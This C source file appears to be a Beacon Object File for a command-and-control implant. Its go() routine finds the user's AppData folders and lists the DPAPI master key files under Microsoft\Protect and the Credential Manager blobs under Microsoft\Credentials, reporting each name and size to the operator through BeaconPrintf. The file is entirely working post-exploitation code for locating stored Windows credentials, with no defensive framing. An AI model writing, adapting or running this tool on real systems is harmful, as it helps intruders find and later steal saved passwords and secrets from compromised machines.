#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include "beacon.h"
static void enum_dir(const char *path, const char *label) {
    char searchPath[MAX_PATH];
    _snprintf(searchPath, sizeof(searchPath), "%s\\*", path);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(searchPath, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (fd.cFileName[0] == '.') continue;
        DWORD64 size = ((DWORD64)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        BeaconPrintf(CALLBACK_OUTPUT, "  [%s] %s\\%s  (%llu bytes)\n", label, path, fd.cFileName, (unsigned long long)size);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}
void go(char *args, int alen) {
    (void)args; (void)alen;
    char appdata[MAX_PATH], localAppdata[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) return;
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppdata) != S_OK) return;
    char protectPath[MAX_PATH];
    _snprintf(protectPath, sizeof(protectPath), "%s\\Microsoft\\Protect", appdata);
    BeaconPrintf(CALLBACK_OUTPUT, "=== DPAPI Master Keys ===\n");
    enum_dir(protectPath, "MK");
    char credPath[MAX_PATH];
    _snprintf(credPath, sizeof(credPath), "%s\\Microsoft\\Credentials", appdata);
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== CredMan blobs ===\n");
    enum_dir(credPath, "CRED");
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] done\n");
}
